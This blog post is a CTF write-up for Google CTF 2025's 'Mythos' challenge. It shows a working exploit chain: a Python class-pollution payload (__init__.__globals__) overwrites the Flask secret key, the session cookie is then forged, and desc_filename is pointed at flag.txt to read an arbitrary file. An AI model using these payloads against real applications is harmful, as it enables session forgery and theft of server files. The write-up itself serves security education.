<!doctype html><html lang=en><head><script>MathJax={tex:{inlineMath:[['$','$'],['\\(','\\)']],displayMath:[['$$','$$'],["\\[","\\]"]],processEscapes:true,processEnvironments:true}}</script><script async id=MathJax-script src=https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js></script><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>MYTHOS</title><meta content=MYTHOS name=title><meta content=exploiitm name=author><meta content="Official blog of Cybersecurity Club, IIT Madras" name=description><meta content=website property=og:type><meta content=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/Mythos/ property=og:url><meta content="exploiitm blog" property=og:site_name><meta content=MYTHOS property=og:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=og:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=og:image><meta content=summary_large_image property=twitter:card><meta content=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/Mythos/ property=twitter:url><meta content=MYTHOS property=twitter:title><meta content="Official blog of Cybersecurity Club, IIT Madras" property=twitter:description><meta content=https://exploiitm.github.io/blog/favicon.ico property=twitter:image><link href=https://exploiitm.github.io/blog/writeups/GoogleCTF2025/Mythos/ rel=canonical><link rel="shortcut icon" href=https://exploiitm.github.io/blog/favicon.ico type=image/x-icon><link href=https://speyll.github.io/suCSS/reset-min.css rel=stylesheet><link href=https://speyll.github.io/suCSS/suCSS-min.css rel=stylesheet><link href=https://exploiitm.github.io/blog/css/style.css rel=stylesheet><script defer src=https://exploiitm.github.io/blog/js/script.js></script><body><header><nav id=nav-bar><a href=https://exploiitm.github.io/> home </a><a href=/blog> blog </a><a href=/blog/writeups> writeups </a><a href=/blog/about> about </a><a href=/blog/contacts> contact </a><div><input id=theme-toggle style=display:none type=checkbox><label for=theme-toggle id=theme-toggle-label><svg class=icons id=theme-icon><use href=https://exploiitm.github.io/blog/icons.svg#lightMode></use></svg></label><audio id=theme-sound><source src=https://exploiitm.github.io/blog/click.ogg type=audio/ogg></audio></div></nav></header><main><div><a href=..>..</a>/<span class=accent-data>Mythos</span></div><time datetime=2025-08-15>Published on: <span class=accent-data>2025-08-15</span></time><address rel=author>By <span class=accent-data> Vibhu Mehrotra, and exploiitm </span></address><h1>MYTHOS</h1><h2 id=summary>Summary</h2><p>On the surface, this game appears to be similar to the terminal games played in the 1980s, where you get 1-4 options and based on your choice the story proceeds, everything is hardcoded. This simple version has only around 20 possibilities to go through and only 1 good ending which you can get only if you collect all the ‘items’ however, that is not sufficient to print the flag, the game on winning returns the descriptions of the items you hold…. So we need to somehow change the filepath of the description to the path of the flag to get the flag printed.<p>This is a very clever probem, requiring the exploitation of two seperate vulnerabilities<ul><li>Overwriting the flask session key with a compromised key known to attacker. This can be done due to a poorly written copy function which doesn’t sanitation the input<li>Blindly reading a ‘description file’ without checking if it is in the authorised directory.</ul><p>simply put, our access to session key allows us to overwrite the path of a certain description file name, which is in a certain scenario printed out.<h2 id=solution>Solution:</h2><ul><li>Step 1: replace the app session key with our own compromised key here is the python code where the key is defined, a random 40 bit key clearly infeasible to bruteforce</ul><pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>app </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>Flask(</span><span style=color:#fabd2f>__name__</span><span style=color:#fdf4c1>, static_url_path</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>""</span><span style=color:#fdf4c1>, static_folder</span><span style=color:#fe8019>=</span><span style=color:#b8bb26>"static"</span><span style=color:#fdf4c1>)
</span><span>app.config[</span><span style=color:#b8bb26>"SECRET_KEY"</span><span>] </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>rand_name(</span><span style=color:#d3869b>40</span><span style=color:#fdf4c1>)
</span></code></pre><p>The request we can use to overwrite the key is this one:<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>@app.</span><span style=color:#fdf4c1>route</span><span>(</span><span style=color:#b8bb26>"/score"</span><span>, </span><span style=color:#fdf4c1>methods</span><span style=color:#fe8019>=</span><span>[</span><span style=color:#b8bb26>"POST"</span><span>])
</span><span>@</span><span style=color:#fdf4c1>game_session
</span><span style=color:#fa5c4b>def </span><span style=color:#8ec07c>submit</span><span>():
</span><span>    score </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ScoreSubmission(session[</span><span style=color:#b8bb26>"game"</span><span style=color:#fdf4c1>][</span><span style=color:#b8bb26>"player"</span><span style=color:#fdf4c1>])
</span><span>    </span><span style=color:#fdf4c1>copy(request.json, score)
</span><span>
</span><span>    acquired_items </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>json.loads(session[</span><span style=color:#b8bb26>"items"</span><span style=color:#fdf4c1>].decode())
</span><span>    score.items </span><span style=color:#fe8019>= </span><span>acquired_items
</span><span>    </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>score.toJSON()
</span></code></pre><p>the important lines are:<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>score </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>ScoreSubmission(session[</span><span style=color:#b8bb26>"game"</span><span style=color:#fdf4c1>][</span><span style=color:#b8bb26>"player"</span><span style=color:#fdf4c1>])
</span><span style=color:#fdf4c1>copy(request.json, score)
</span><span>
</span></code></pre><p>score is a an object storing the properties of the current session and now we use copy to blindly copy request.json (our input) directly into score, i.e directly replacing the information in the session so we use the following post request:<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fdf4c1>s.post(URL </span><span style=color:#fe8019>+ </span><span style=color:#b8bb26>'score'</span><span style=color:#fdf4c1>, json</span><span style=color:#fe8019>=</span><span style=color:#fdf4c1>{</span><span style=color:#b8bb26>"__init__"</span><span style=color:#fdf4c1>:{</span><span style=color:#b8bb26>"__globals__"</span><span style=color:#fdf4c1>:{</span><span style=color:#b8bb26>"app"</span><span style=color:#fdf4c1>:{</span><span style=color:#b8bb26>"config"</span><span style=color:#fdf4c1>:{</span><span style=color:#b8bb26>"SECRET_KEY"</span><span style=color:#fdf4c1>:NEW_SECRET}}}}})
</span><span>
</span></code></pre><p>withing copy, this occurs:<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span style=color:#fabd2f>setattr</span><span style=color:#fdf4c1>(dst, k, v) 
</span></code></pre><p>which basically blindly replaces wherever the key k is found with our user value v.<p><strong>We now have full control over the session cookies etc, and we can make requests ‘as’ the server itself</strong><ul><li>Now we need to do two things, get ‘All’ items in the game and then go through the game and reach the good ending (we can only reach good ending if the game sees that we have all the items)</ul><p>we can do this by<pre class=language-python data-lang=python style=background:#282828;color:#fdf4c1aa><code class=language-python data-lang=python><span>
</span><span>s </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>requests.session()
</span><span>r </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>s.get(URL)
</span><span>data </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>FSCM.decode(s.cookies[</span><span style=color:#b8bb26>'session'</span><span style=color:#fdf4c1>],NEW_SECRET)
</span><span>data[</span><span style=color:#b8bb26>'items'</span><span>] </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>json.dumps({</span><span style=color:#b8bb26>"mimic_gem"</span><span style=color:#fdf4c1>: </span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"mermaid_scale"</span><span style=color:#fdf4c1>:</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"angels_scarf"</span><span style=color:#fdf4c1>:</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"mew_plaque"</span><span style=color:#fdf4c1>:</span><span style=color:#d3869b>1</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"Mythos"</span><span style=color:#fdf4c1>:{</span><span style=color:#b8bb26>"deserialize"</span><span style=color:#fdf4c1>:</span><span style=color:#b8bb26>"item_delegate"</span><span style=color:#fdf4c1>},</span><span style=color:#b8bb26>"desc_filename"</span><span style=color:#fdf4c1>:</span><span style=color:#b8bb26>"flag.txt"</span><span style=color:#fdf4c1>,</span><span style=color:#b8bb26>"name"</span><span style=color:#fdf4c1>:</span><span style=color:#b8bb26>"test"</span><span style=color:#fdf4c1>}).encode()
</span><span>
</span><span>new_session </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>FSCM.encode(NEW_SECRET, </span><span style=color:#fabd2f>str</span><span style=color:#fdf4c1>(data))
</span><span style=color:#fdf4c1>COOKIES </span><span style=color:#fe8019>= </span><span>{</span><span style=color:#b8bb26>'session'</span><span>: new_session}
</span></code></pre><p>What we are doing here is simple, we create a new HTTP session using the polluted key, and as part of the session creation we include the session data of items to be all the items in the game (required to reach win screen).<p>item_delegate is:<pre class=language-pm data-lang=pm style=background:#282828;color:#fdf4c1aa><code class=language-pm data-lang=pm><span style=color:#fa5c4b>my </span><span style=color:#fdf4c1>$game_artifacts </span><span style=color:#fe8019>= </span><span>{
</span><span>    </span><span style=color:#fdf4c1>item_delegate    </span><span>=> </span><span style=color:#fa5c4b>sub </span><span>{
</span><span>                            </span><span style=color:#fa5c4b>my </span><span style=color:#fdf4c1>$obj </span><span style=color:#fe8019>= </span><span style=color:#fabd2f>shift</span><span>; 
</span><span>                            </span><span style=color:#fa5c4b>if </span><span>(</span><span style=color:#fabd2f>defined </span><span style=color:#fdf4c1>$obj</span><span>->{</span><span style=color:#fdf4c1>desc_filename</span><span>}) {
</span><span>                                </span><span style=color:#fdf4c1>$obj</span><span>->{</span><span style=color:#fdf4c1>desc</span><span>} </span><span style=color:#fe8019>= </span><span style=color:#fdf4c1>read_file</span><span>(</span><span style=color:#fdf4c1>$obj</span><span>->{</span><span style=color:#fdf4c1>desc_filename</span><span>});
</span><span>                                </span><span style=color:#fa5c4b>return </span><span>{
</span><span>                                    </span><span style=color:#fdf4c1>name</span><span>=></span><span style=color:#fdf4c1>$obj</span><span>->{</span><span style=color:#fdf4c1>name</span><span>},
</span><span>                                    </span><span style=color:#fdf4c1>desc</span><span>=></span><span style=color:#fdf4c1>$obj</span><span>->{</span><span style=color:#fdf4c1>desc</span><span>}
</span><span>                                    };
</span><span>                                } </span><span style=color:#fa5c4b>return </span><span style=color:#fdf4c1>$obj</span><span>;
</span><span>                            },
</span><span>    </span><span style=color:#fe8019>....
</span><span>};
</span></code></pre><p>So we basically pass in the name ‘test’ and file of description as flag.txt… so it simply reads the flag and returns it to us once we reach the ‘good ending’. Reaching the good ending is trivial since using the events.json provided to us we can map out the correct path. >Credit for code and solution @Anony from the GCTF discord.<p class=tags-data></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br></div><div class=footRight><img class="footGif noStyle" alt=footGif loading=lazy src=https://i.ibb.co/XYDpfcs/foot.gif><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=metaData href=https://exploiitm.github.io/blog/atom.xml target=_blank>RSS</a></div></div></footer>